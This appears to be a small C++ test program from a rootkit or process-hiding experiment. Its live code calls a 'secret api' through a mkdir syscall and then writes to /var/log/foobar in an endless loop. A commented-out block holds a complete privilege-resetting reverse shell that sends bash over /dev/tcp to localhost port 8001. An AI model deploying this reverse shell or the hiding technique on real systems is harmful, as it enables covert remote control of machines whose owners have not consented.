//this is the binary we want to hide.
#include <fstream>
#include <unistd.h>
#include <sys/syscall.h>
#include "secrets.h"
#include <string>
#include <iostream>
using namespace std;
int main() {
	string arg = secret_api_print;
	arg += "secret api called";
	cout << "making directory: " << arg << endl;
	cout << "result: " << syscall(SYS_mkdir, arg.c_str()) << endl;
	while (true) {
		ofstream outfile("/var/log/foobar", ofstream::app);
		outfile << "foobar" << endl;
		outfile.close();
		sleep(1);
	}
}

/* Originally I was going to make this open a reverse shell, 
   but then we'd have to hide the reverse shell process too
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <grp.h>
int main() {
	setreuid(0, 0);
	char* const args[4] = {
		"/bin/bash",
		"-c",
		"/bin/bash -i >& /dev/tcp/localhost/8001 0>&1",
		0
	};
	execve("/bin/bash", args, 0);
	return 0;
}*/
